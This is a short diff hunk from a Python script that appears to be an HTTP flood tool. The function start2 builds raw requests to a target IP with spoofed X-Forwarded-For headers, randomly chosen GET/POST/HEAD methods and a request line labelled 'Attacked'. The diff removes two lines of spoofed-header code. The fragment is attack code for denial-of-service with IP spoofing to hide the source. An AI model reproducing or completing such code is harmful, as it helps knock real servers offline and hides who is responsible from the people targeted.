@@ -396,8 +396,6 @@ def start2():
   connection += "Cache-Control: max-age=0\r\n"
   connection += "pragma: no-cache\r\n"
   connection += "X-Forwarded-For: " + spoofer1() + "\r\n"
-  connection2 += "X-Forwarded-For: " + spoofer2() + "\r\n"
-  connection3 += "X-Forwarded-For: " + spoofer3() + "\r\n"
   connect = "Connection : keep-Alive\r\n\r\n"
   get_rand = random.choice(['GET','POST',"HEAD"])
   get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
